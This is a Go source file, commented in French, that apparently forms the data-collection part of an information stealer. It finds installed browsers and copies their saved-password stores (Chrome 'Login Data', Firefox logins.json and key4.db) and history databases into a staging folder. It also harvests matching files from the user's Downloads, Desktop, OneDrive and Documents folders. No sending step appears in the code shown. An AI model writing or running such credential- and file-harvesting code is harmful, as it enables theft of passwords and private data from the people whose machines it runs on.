package getdata

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

// Vérifie les navigateurs installés
func CheckInstalledBrowsers() map[string]string {
	var browsers = map[string]string{}
	installedBrowsers := make(map[string]string)
	var mu sync.Mutex
	var wg sync.WaitGroup

	switch runtime.GOOS {
	case "windows":
		browsers["Google Chrome"] = `C:\Program Files\Google\Chrome\Application\chrome.exe`
		browsers["Mozilla Firefox"] = `C:\Program Files\Mozilla Firefox\firefox.exe`
		browsers["Brave"] = `C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe`
		browsers["Microsoft Edge"] = `C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`
		browsers["Opera"] = `C:\Program Files\Opera\launcher.exe`
		browsers["TOR"] = `C:\Program Files\Tor Browser\Browser\firefox.exe`
		browsers["Avast"] = `C:\Program Files\AVAST Software\Browser\Application\AvastBrowser.exe`

	case "darwin":
		browsers["Google Chrome"] = `/Applications/Google Chrome.app`
		browsers["Mozilla Firefox"] = `/Applications/Firefox.app`
		browsers["Brave"] = `/Applications/Brave Browser.app`
		browsers["Microsoft Edge"] = `/Applications/Microsoft Edge.app`
		browsers["Opera"] = `/Applications/Opera.app`
		browsers["TOR"] = `/Applications/Tor Browser.app`
		browsers["Safari"] = `/Applications/Safari.app`

	case "linux":
		browsers["Google Chrome"] = `/usr/bin/google-chrome`
		browsers["Mozilla Firefox"] = `/usr/bin/firefox`
		browsers["Brave"] = `/usr/bin/brave-browser`
		browsers["Microsoft Edge"] = `/usr/bin/microsoft-edge`
		browsers["Opera"] = `/usr/bin/opera`
		browsers["TOR"] = `/usr/bin/tor-browser`
		browsers["Avast"] = `/usr/bin/avast-browser`
	}

	fmt.Println("Vérification des navigateurs installés :")

	for name, path := range browsers {
		wg.Add(1)
		go func(browserName, browserPath string) {
			defer wg.Done()
			if _, err := os.Stat(browserPath); os.IsNotExist(err) {
				fmt.Printf("%s n'est pas installé.\n", browserName)
			} else {
				fmt.Printf("%s est installé.\n", browserName)
				mu.Lock()
				installedBrowsers[browserName] = browserPath
				mu.Unlock()
			}
		}(name, path)
	}

	wg.Wait()

	return installedBrowsers
}

// Récupère les chemins des fichiers d'historique des navigateurs
func GetHistoryFilePath(browser string) ([]string, error) {
	var filePaths []string
	userHome, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	var basePath string

	switch browser {
	case "Google Chrome":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
		}

	case "Mozilla Firefox":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
		case "linux":
			basePath = filepath.Join(userHome, `.mozilla/firefox`)
		}

	case "Brave":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\BraveSoftware\Brave-Browser\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/BraveSoftware/Brave-Browser/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/BraveSoftware/Brave-Browser/Default`)
		}

	default:
		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
	}

	err = filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && strings.HasSuffix(info.Name(), ".sqlite") {
			filePaths = append(filePaths, path)
		}
		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("erreur lors de la recherche des fichiers SQL : %v", err)
	}

	return filePaths, nil
}

// Récupère les fichiers de mots de passe
func GetPasswordFiles(browser string) ([]string, error) {
	var filePaths []string
	userHome, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	var basePath string

	switch browser {
	case "Google Chrome":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
		case "linux":
			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "Login Data"))

	case "Mozilla Firefox":
		switch runtime.GOOS {
		case "windows":
			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
		case "darwin":
			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
		case "linux":
			basePath = filepath.Join(userHome, `.mozilla/firefox`)
		}
		filePaths = append(filePaths, filepath.Join(basePath, "logins.json"))
		filePaths = append(filePaths, filepath.Join(basePath, "key4.db"))

	default:
		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
	}

	return filePaths, nil
}

// Copier un fichier
func CopyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	return nil
}

// Obtenir les fichiers d'un répertoire selon une liste d'extensions et de noms
func GetFiles(dir string, extensions, names []string) ([]string, error) {
	var result []string

	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		for _, ext := range extensions {
			if filepath.Ext(path) == ext {
				for _, name := range names {
					if strings.Contains(strings.ToLower(filepath.Base(path)), strings.ToLower(name)) {
						result = append(result, path)
						break
					}
				}
				break
			}
		}
		return nil
	})

	if err != nil {
		return nil, err
	}

	return result, nil
}

// Vider le contenu du dossier DATA
func ClearDataFolder(folderName string) error {
	err := filepath.Walk(folderName, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if path == folderName {
			return nil // Ignore le dossier lui-même
		}
		if info.IsDir() {
			return os.RemoveAll(path) // Supprime les sous-dossiers
		}
		return os.Remove(path) // Supprime les fichiers
	})
	return err
}

// Créer les sous-dossiers dans DATA
func CreateSubfolders(baseFolder string) error {
	subfolders := []string{
		"Downloads",
		"Desktop",
		"Documents",
		"Navigateurs",
	}

	for _, folder := range subfolders {
		folderPath := filepath.Join(baseFolder, folder)
		if err := os.MkdirAll(folderPath, 0755); err != nil {
			return fmt.Errorf("erreur lors de la création du dossier %s : %v", folder, err)
		}
	}
	return nil
}

// Traiter les données dans le dossier DATA
func ProcessData(dataFolder string, extensions, names []string) error {
	if _, err := os.Stat(dataFolder); os.IsNotExist(err) {
		err := os.Mkdir(dataFolder, 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du dossier DATA : %v", err)
		}
	}

	browsersFolder := filepath.Join(dataFolder, "Navigateurs")
	if _, err := os.Stat(browsersFolder); os.IsNotExist(err) {
		err := os.Mkdir(browsersFolder, 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du dossier Navigateurs : %v", err)
		}
	}

	installedBrowsers := CheckInstalledBrowsers()

	for browser := range installedBrowsers {
		browserFolder := filepath.Join(browsersFolder, browser)
		if _, err := os.Stat(browserFolder); os.IsNotExist(err) {
			err := os.Mkdir(browserFolder, 0755)
			if err != nil {
				fmt.Printf("Erreur lors de la création du dossier %s pour %s : %v\n", browserFolder, browser, err)
				continue
			}
		}

		filePaths, err := GetHistoryFilePath(browser)
		if err != nil {
			fmt.Printf("Erreur lors de la récupération des fichiers pour %s : %v\n", browser, err)
			continue
		}

		for _, filePath := range filePaths {
			if _, err := os.Stat(filePath); os.IsNotExist(err) {
				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
			} else {
				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)

				destination := filepath.Join(browserFolder, filepath.Base(filePath))
				err := CopyFile(filePath, destination)
				if err != nil {
					fmt.Printf("Erreur lors de la copie du fichier de %s : %v\n", browser, err)
				} else {
					fmt.Printf("Le fichier de %s a été copié dans %s\n", browser, destination)
				}
			}
		}

		// Récupérer les fichiers de mots de passe et les copier
		passwordFiles, err := GetPasswordFiles(browser)
		if err != nil {
			fmt.Printf("Erreur lors de la récupération des fichiers de mots de passe pour %s : %v\n", browser, err)
			continue
		}

		for _, filePath := range passwordFiles {
			if _, err := os.Stat(filePath); os.IsNotExist(err) {
				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
			} else {
				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)

				destination := filepath.Join(browserFolder, filepath.Base(filePath))
				err := CopyFile(filePath, destination)
				if err != nil {
					fmt.Printf("Erreur lors de la copie du fichier de mots de passe de %s : %v\n", browser, err)
				} else {
					fmt.Printf("Le fichier de mots de passe de %s a été copié dans %s\n", browser, destination)
				}
			}
		}
	}

	err := CopyFilesToUserDirectories(dataFolder, extensions, names)
	if err != nil {
		return fmt.Errorf("erreur lors de la copie des fichiers : %v", err)
	}

	return nil
}

func CopyFilesToUserDirectories(dataFolder string, extensions, names []string) error {
	userHome, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
	}

	oneDriveDesktop := filepath.Join(userHome, "OneDrive", "Desktop")

	directories := []string{
		filepath.Join(userHome, "Downloads"),
		filepath.Join(userHome, "Desktop"),
		oneDriveDesktop,
		filepath.Join(userHome, "Documents"),
	}

	subFolders := []string{"Downloads", "Desktop", "Documents", "Navigateurs"}
	for _, folder := range subFolders {
		err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755)
		if err != nil {
			return fmt.Errorf("erreur lors de la création du sous-dossier %s : %v", folder, err)
		}
	}

	var wg sync.WaitGroup

	for _, dir := range directories {
		wg.Add(1)

		go func(dir string) {
			defer wg.Done()

			fmt.Printf("Recherche de fichiers dans : %s\n", dir)

			files, err := GetFiles(dir, extensions, names)
			if err != nil {
				fmt.Printf("Erreur lors de la récupération des fichiers dans %s : %v\n", dir, err)
				return
			}

			for _, filePath := range files {
				fileName := filepath.Base(filePath)
				var destinationDir string

				switch {
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Downloads")):
					destinationDir = filepath.Join(dataFolder, "Downloads")
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Desktop")):
					destinationDir = filepath.Join(dataFolder, "Desktop")
				case strings.HasPrefix(filePath, oneDriveDesktop):
					destinationDir = filepath.Join(dataFolder, "Desktop")
				case strings.HasPrefix(filePath, filepath.Join(userHome, "Documents")):
					destinationDir = filepath.Join(dataFolder, "Documents")
				}

				destination := filepath.Join(destinationDir, fileName)

				err := CopyFile(filePath, destination)
				if err != nil {
					fmt.Printf("Erreur lors de la copie de %s : %v\n", filePath, err)
				} else {
					fmt.Printf("Fichier %s copié dans %s\n", fileName, destinationDir)
				}
			}
		}(dir)
	}

	wg.Wait()
	return nil
}
